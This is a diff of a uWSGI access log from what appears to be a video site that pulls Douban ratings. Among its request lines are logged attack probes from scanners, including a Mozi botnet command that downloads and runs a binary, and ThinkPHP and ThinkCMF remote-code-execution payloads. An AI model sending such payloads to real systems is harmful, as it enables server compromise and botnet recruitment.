@@ -1,206 +1,237 @@
-[1591718401] ./uwsgi.log reopened.
-————————豆瓣id获取完毕————————
-[pid: 13880|app: 0|req: 58/207] 183.27.46.44 () {44 vars in 920 bytes} [Tue Jun  9 23:12:24 2020] GET /admin/get_rating/ => generated 4 bytes in 5276932 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
-[pid: 13880|app: 0|req: 59/208] 36.72.217.234 () {32 vars in 463 bytes} [Wed Jun 10 00:50:53 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 125/209] 195.54.160.135 () {34 vars in 556 bytes} [Wed Jun 10 01:07:21 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 126/210] 192.35.168.202 () {34 vars in 394 bytes} [Wed Jun 10 01:15:25 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 127/211] 195.54.160.135 () {36 vars in 653 bytes} [Wed Jun 10 01:24:08 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13879|app: 0|req: 18/212] 195.54.160.135 () {34 vars in 556 bytes} [Wed Jun 10 01:24:08 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 128/213] 195.54.160.135 () {34 vars in 716 bytes} [Wed Jun 10 01:43:53 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13879|app: 0|req: 19/214] 109.162.142.96 () {32 vars in 464 bytes} [Wed Jun 10 01:52:26 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 129/215] 186.213.25.48 () {32 vars in 463 bytes} [Wed Jun 10 03:32:56 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 130/216] 114.234.157.216 () {34 vars in 644 bytes} [Wed Jun 10 03:54:37 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 131/217] 95.47.51.195 () {32 vars in 462 bytes} [Wed Jun 10 05:05:27 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 132/218] 193.118.53.194 () {34 vars in 488 bytes} [Wed Jun 10 06:15:13 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 133/219] 195.54.160.135 () {38 vars in 610 bytes} [Wed Jun 10 06:34:38 2020] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 134/220] 172.105.89.161 () {34 vars in 490 bytes} [Wed Jun 10 07:22:11 2020] GET /0bef => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 135/221] 71.6.232.4 () {34 vars in 484 bytes} [Wed Jun 10 08:24:54 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 136/222] 182.254.52.17 () {36 vars in 589 bytes} [Wed Jun 10 09:17:13 2020] GET /admin/view_log/?page%3D7 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 137/223] 182.254.52.17 () {38 vars in 635 bytes} [Wed Jun 10 09:17:13 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 138/224] 128.14.134.134 () {34 vars in 488 bytes} [Wed Jun 10 09:45:04 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 139/225] 187.11.32.136 () {32 vars in 464 bytes} [Wed Jun 10 09:46:44 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 140/226] 183.136.225.57 () {34 vars in 455 bytes} [Wed Jun 10 10:01:00 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 141/227] 67.85.229.170 () {28 vars in 307 bytes} [Wed Jun 10 10:01:45 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 142/228] 172.104.108.109 () {34 vars in 391 bytes} [Wed Jun 10 10:14:16 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 143/229] 45.79.141.231 () {32 vars in 414 bytes} [Wed Jun 10 11:10:49 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 144/230] 112.96.199.149 () {42 vars in 871 bytes} [Wed Jun 10 11:18:34 2020] GET /video/ => generated 60191 bytes in 407 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 145/231] 112.96.199.149 () {42 vars in 902 bytes} [Wed Jun 10 11:18:42 2020] GET /admin/view_log/?page=8 => generated 0 bytes in 2 msecs (HTTP/1.1 302) 6 headers in 184 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 146/232] 112.96.199.149 () {42 vars in 899 bytes} [Wed Jun 10 11:18:43 2020] GET /view_log/2020-06-10/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 147/233] 112.96.199.149 () {42 vars in 902 bytes} [Wed Jun 10 11:18:45 2020] GET /admin/view_log/?page=8 => generated 0 bytes in 2 msecs (HTTP/1.1 302) 6 headers in 184 bytes (1 switches on core 1)
-[pid: 13880|app: 0|req: 60/234] 112.96.199.149 () {42 vars in 899 bytes} [Wed Jun 10 11:18:45 2020] GET /view_log/2020-06-10/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13880|app: 0|req: 61/235] 112.96.199.149 () {42 vars in 889 bytes} [Wed Jun 10 11:18:50 2020] GET /admin/view_log/ => generated 17240 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 148/236] 112.96.199.149 () {44 vars in 961 bytes} [Wed Jun 10 11:18:54 2020] GET /admin/view_log/2020-06-09 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 165 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 149/237] 112.96.199.149 () {44 vars in 963 bytes} [Wed Jun 10 11:18:54 2020] GET /admin/view_log/2020-06-09/ => generated 22561 bytes in 21 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 150/238] 112.96.199.149 () {44 vars in 987 bytes} [Wed Jun 10 11:18:57 2020] GET /admin/view_log/2020-06-09/?page=8 => generated 19049 bytes in 22 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 151/239] 112.96.199.149 () {44 vars in 941 bytes} [Wed Jun 10 11:19:05 2020] GET /admin/ => generated 30034 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
-————————开始获取豆瓣id数据————————
-无豆瓣id的视频总数：6529
-无匹配视频总数：2430
-重复数据的视频总数：548
-————————开始更新豆瓣评分数据————————
-[pid: 13880|app: 0|req: 62/240] 112.96.199.149 () {44 vars in 932 bytes} [Wed Jun 10 11:19:11 2020] GET /admin/view_log/ => generated 17707 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
-[pid: 13880|app: 0|req: 63/241] 112.96.199.149 () {44 vars in 954 bytes} [Wed Jun 10 11:20:03 2020] GET /admin/view_log/?page=1 => generated 17756 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-第五大道第一季 6.9 保存成功[rating]
-谁都渴望遇见你 30385403 保存成功[douban]
-各位国民 7.5 保存成功[rating]
-暗黑第二季 27611018 保存成功[douban]
-若不曾遇见你 33218462 保存成功[douban]
-一级方程式：疾速争胜第一季 30465634 保存成功[douban]
-河谷镇第三季 7.4 保存成功[rating]
-美女摔角联盟第三季 30305791 保存成功[douban]
-与弩男同骑第三季 33382714 保存成功[douban]
-法医朝颜 匹配到多个豆瓣id数据，存入列表2 ['33424109', '34841445']
-十年三月三十日 27062691 保存成功[douban]
-四女奇缘 34845471 保存成功[douban]
-八墓村 30458424 保存成功[douban]
-一人露营 34810452 保存成功[douban]
-那就爱上你 34439414 保存成功[douban]
-[pid: 13880|app: 0|req: 64/242] 112.96.199.149 () {44 vars in 961 bytes} [Wed Jun 10 11:45:40 2020] GET /admin/view_log/?page=1 => generated 18599 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
-梅赛德斯先生第三季 30383144 保存成功[douban]
-少年寅次郎 34602888 保存成功[douban]
-孤独的美食家第八季 34801559 保存成功[douban]
-长安十二时辰 26849758 保存成功[douban]
-芝加哥故事第二季 30135558 保存成功[douban]
-惹不起的殿下大人 30419906 保存成功[douban]
-东邻西舍第二季 33462537 保存成功[douban]
-一年365天：我的房子你的家 33400445 保存成功[douban]
-新绅士的成长 30490104 保存成功[douban]
-[pid: 13880|app: 0|req: 65/243] 112.96.199.149 () {44 vars in 961 bytes} [Wed Jun 10 11:57:09 2020] GET /admin/view_log/?page=1 => generated 19144 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-[pid: 13880|app: 0|req: 66/244] 112.96.199.149 () {44 vars in 961 bytes} [Wed Jun 10 11:57:29 2020] GET /admin/view_log/?page=1 => generated 19200 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
-东京宇宙人兄弟 30214118 保存成功[douban]
-与神的约定 30346899 保存成功[douban]
-N世代 30394641 保存成功[douban]
-女城主直虎 7.2 保存成功[rating]
-高兴遇见你 匹配到多个豆瓣id数据，存入列表2 ['26657836', '26834059']
-一出好戏网剧版 30331440 保存成功[douban]
-杨光的快乐生活之绅士品格 34482124 保存成功[douban]
-媚者无疆 27089387 保存成功[douban]
-我们的千阙歌 26219653 保存成功[douban]
-粉雄救兵第一季 26964443 保存成功[douban]
-S.C.I.谜案集 26816381 保存成功[douban]
-巨怪猎人第三季 30222217 保存成功[douban]
-一路繁花相送 匹配到多个豆瓣id数据，存入列表2 ['26615514', '30163784']
-为了你，我愿意热爱整个世界 26974046 保存成功[douban]
-天意 34925530 保存成功[douban]
-离婚第二季 26915226 保存成功[douban]
-恋爱脱线时 27067943 保存成功[douban]
-那个男人吴洙 27180957 保存成功[douban]
-大明王朝1566 9.7 保存成功[rating]
-小神的孩子们 27178971 保存成功[douban]
-Byplayers 2：五个老戏骨 勇闯无人岛 27621185 保存成功[douban]
-海月姬 27192249 保存成功[douban]
-监査人野崎修平 27166458 保存成功[douban]
-————————豆瓣评分数据更新完毕————————
-[pid: 13881|app: 0|req: 153/245] 112.96.199.149 () {44 vars in 929 bytes} [Wed Jun 10 11:19:09 2020] GET /admin/update_rating/ => generated 4 bytes in 3530901 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 1)
-最大的小小农场 30330264 保存成功[douban]
-不速归客第一季 27131912 保存成功[douban]
-决币 26377691 保存成功[douban]
-羁绊：奔跑的奇迹小马 26836323 保存成功[douban]
-恋在香港 27163330 保存成功[douban]
-梁山伯与祝英台新传 26919581 保存成功[douban]
-再见了江成君 27068580 保存成功[douban]
-冒牌牧师第二季 26862128 保存成功[douban]
-倾听心灵 第三季 26937835 保存成功[douban]
-羞耻 第三季 26811832 保存成功[douban]
-蓝色海洋的传说 26806061 保存成功[douban]
-横沟正史短篇集 26913748 保存成功[douban]
-诗词中国 匹配到多个豆瓣id数据，存入列表2 ['26860785', '26685399']
-持摄像机的人 26722604 保存成功[douban]
-贾斯汀·汀布莱克与田纳西孩子们 26601361 保存成功[douban]
-面对面第一季 26372639 8.3保存成功[douban]
-芈月传奇之战国红颜 26697943 保存成功[douban]
-战斗民族养成记 26775543 保存成功[douban]
-洗脑游戏 26639994 保存成功[douban]
-长沙保卫战 20388217 保存成功[douban]
-中国青年 匹配到多个豆瓣id数据，存入列表2 ['26280541', '26322781']
-人见人爱 25837793 保存成功[douban]
-母子连心 7061231 保存成功[douban]
-南国医恋第四季 25924167 保存成功[douban]
-同心兄弟 20388208 保存成功[douban]
-摩斯探长前传第一季 22507437 保存成功[douban]
-妮基塔第四季 24695310 保存成功[douban]
-百万新娘之爱无悔 11632428 保存成功[douban]
-杀无赦第二季 25753968 保存成功[douban]
-闯天下 10527227 保存成功[douban]
-X医生：外科医生大门未知子第2季 25704580 保存成功[douban]
-蓝天花朵 10767524 保存成功[douban]
-最后一枪 6514116 保存成功[douban]
-警察世家第三季 11498666 保存成功[douban]
-开膛街第一季 10441623 保存成功[douban]
-新闻编辑室第一季 6142597 保存成功[douban]
-广告狂人第五季 6859640 保存成功[douban]
-欢乐合唱团第四季 10733232 保存成功[douban]
-赏金猎人 10590758 保存成功[douban]
-皇家律师第一季 5919662 保存成功[douban]
-飞天大盗第七季 5908471 保存成功[douban]
-星光都市 5975196 保存成功[douban]
-青春密语第四季 6521751 保存成功[douban]
-烽火燃情 6727298 保存成功[douban]
-怪侠一枝梅 4861422 保存成功[douban]
-神秘博士第五季 4249704 保存成功[douban]
-神话 3732699 保存成功[douban]
-瞧这一家子 5313416 保存成功[douban]
-海上传奇 3768185 保存成功[douban]
-犯罪现场调查：迈阿密第五季 4132895 保存成功[douban]
-我叫金三顺 1477894 保存成功[douban]
-南极坚忍号 1308155 保存成功[douban]
-唇膏 1774231 保存成功[douban]
-神厨 3543683 保存成功[douban]
-[pid: 13881|app: 0|req: 154/246] 162.243.144.233 () {34 vars in 407 bytes} [Wed Jun 10 14:13:51 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-————————豆瓣id获取完毕————————
-[pid: 13881|app: 0|req: 154/247] 112.96.199.149 () {44 vars in 923 bytes} [Wed Jun 10 11:19:07 2020] GET /admin/get_rating/ => generated 4 bytes in 10662473 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 155/248] 2.183.213.15 () {32 vars in 463 bytes} [Wed Jun 10 14:17:51 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13880|app: 0|req: 67/249] 200.37.187.186 () {32 vars in 465 bytes} [Wed Jun 10 15:01:48 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 156/250] 62.234.113.228 () {34 vars in 501 bytes} [Wed Jun 10 17:02:32 2020] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 157/251] 62.234.113.228 () {34 vars in 487 bytes} [Wed Jun 10 17:02:33 2020] GET /TP/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13880|app: 0|req: 68/252] 62.234.113.228 () {34 vars in 523 bytes} [Wed Jun 10 17:02:33 2020] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13879|app: 0|req: 20/253] 62.234.113.228 () {34 vars in 505 bytes} [Wed Jun 10 17:02:33 2020] GET /html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13880|app: 0|req: 69/254] 62.234.113.228 () {34 vars in 495 bytes} [Wed Jun 10 17:02:33 2020] GET /public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13878|app: 0|req: 9/255] 62.234.113.228 () {34 vars in 511 bytes} [Wed Jun 10 17:02:33 2020] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13878|app: 0|req: 10/256] 62.234.113.228 () {34 vars in 483 bytes} [Wed Jun 10 17:02:33 2020] GET /elrekt.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13879|app: 0|req: 21/257] 62.234.113.228 () {34 vars in 481 bytes} [Wed Jun 10 17:02:33 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 158/258] 62.234.113.228 () {34 vars in 466 bytes} [Wed Jun 10 17:02:33 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 159/259] 177.72.2.186 () {32 vars in 463 bytes} [Wed Jun 10 18:13:05 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 160/260] 101.251.242.238 () {38 vars in 597 bytes} [Wed Jun 10 19:08:16 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 161/261] 112.96.199.149 () {42 vars in 902 bytes} [Wed Jun 10 19:29:26 2020] GET /admin/view_log/?page=1 => generated 22045 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 162/262] 112.96.199.149 () {44 vars in 961 bytes} [Wed Jun 10 19:30:05 2020] GET /admin/view_log/?page=2 => generated 18013 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
-[pid: 13881|app: 0|req: 163/263] 112.96.199.149 () {44 vars in 930 bytes} [Wed Jun 10 19:30:11 2020] GET /admin/ => generated 30034 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
-————————开始获取豆瓣id数据————————
-无豆瓣id的视频总数：6462
-无匹配视频总数：2430
-重复数据的视频总数：553
-[pid: 13881|app: 0|req: 165/264] 112.96.199.149 () {44 vars in 932 bytes} [Wed Jun 10 19:30:15 2020] GET /admin/view_log/ => generated 22045 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-[pid: 13880|app: 0|req: 70/265] 112.96.199.149 () {44 vars in 954 bytes} [Wed Jun 10 19:30:18 2020] GET /admin/view_log/?page=2 => generated 18330 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
-恶党~犯罪者追踪调查 30461661 保存成功[douban]
-未来的秘密 30482133 保存成功[douban]
-[pid: 13881|app: 0|req: 166/266] 34.75.43.253 () {28 vars in 310 bytes} [Wed Jun 10 19:52:35 2020] OPTIONS / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 4 headers in 128 bytes (1 switches on core 1)
-无声好友第二季 30212189 保存成功[douban]
-极速青春 26900553 保存成功[douban]
-狂赌之渊 真人电视剧版 27205123 保存成功[douban]
-刀尖舞者 30370906 保存成功[douban]
-无为大师 第二季 26734201 保存成功[douban]
-[pid: 13881|app: 0|req: 167/267] 62.4.14.198 () {34 vars in 516 bytes} [Wed Jun 10 21:07:38 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 168/268] 195.54.160.135 () {34 vars in 556 bytes} [Wed Jun 10 21:25:42 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 169/269] 195.54.160.135 () {36 vars in 653 bytes} [Wed Jun 10 21:26:47 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 170/270] 195.54.160.135 () {34 vars in 556 bytes} [Wed Jun 10 21:27:01 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 171/271] 195.54.160.135 () {34 vars in 716 bytes} [Wed Jun 10 21:29:51 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-[pid: 13881|app: 0|req: 172/272] 185.111.187.198 () {32 vars in 465 bytes} [Wed Jun 10 21:51:44 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-傲骨贤妻第四季 10549253 保存成功[douban]
-[pid: 13881|app: 0|req: 173/273] 195.54.160.135 () {38 vars in 610 bytes} [Wed Jun 10 22:07:11 2020] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-女儿门 5958580 保存成功[douban]
-乱世新娘 4328456 保存成功[douban]
-东京生死恋 4019434 保存成功[douban]
-危机边缘第一季 2338071 保存成功[douban]
-[pid: 13881|app: 0|req: 174/274] 45.76.144.219 () {36 vars in 432 bytes} [Wed Jun 10 22:31:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
-实习医生格蕾第四季 3275425 保存成功[douban]
-屋顶上的绿宝石 2193492 保存成功[douban]
-犯罪心理第二季 2154354 保存成功[douban]
-大醉侠 3401414 保存成功[douban]
-[pid: 13881|app: 0|req: 175/275] 113.69.35.228 () {44 vars in 960 bytes} [Wed Jun 10 22:55:25 2020] GET /admin/view_log/?page=2 => generated 19594 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-[pid: 13880|app: 0|req: 71/276] 113.69.35.228 () {44 vars in 960 bytes} [Wed Jun 10 22:55:30 2020] GET /admin/view_log/?page=2 => generated 19649 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
-————————豆瓣id获取完毕————————
-[pid: 13881|app: 0|req: 175/277] 112.96.199.149 () {44 vars in 923 bytes} [Wed Jun 10 19:30:13 2020] GET /admin/get_rating/ => generated 4 bytes in 13130718 msecs (HTTP/1.1 200) 5 headers in 148 bytes (1 switches on core 0)
-*** Starting uWSGI 2.0.18 (64bit) on [Wed Jun 10 23:19:39 2020] ***
+[1592755201] ./uwsgi.log reopened.
+[pid: 10432|app: 0|req: 898/1250] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:01:53 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 899/1251] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:03:53 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 900/1252] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:05:53 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 901/1253] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:07:57 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 902/1254] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:09:58 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 903/1255] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:11:59 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 904/1256] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:14:00 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 905/1257] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:16:00 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 906/1258] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:18:01 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 907/1259] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:20:04 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 908/1260] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:22:04 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 909/1261] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:24:05 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 910/1262] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:26:05 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 911/1263] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:28:06 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 912/1264] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:30:06 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 913/1265] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:32:07 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 914/1266] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:34:07 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 915/1267] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:36:08 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 916/1268] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:38:08 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 917/1269] 162.243.140.180 () {34 vars in 395 bytes} [Mon Jun 22 00:38:33 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 918/1270] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:40:09 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 919/1271] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:42:11 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10432|app: 0|req: 920/1272] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:44:11 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10432|app: 0|req: 921/1273] 174.96.14.245 () {36 vars in 541 bytes} [Mon Jun 22 00:46:12 2020] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
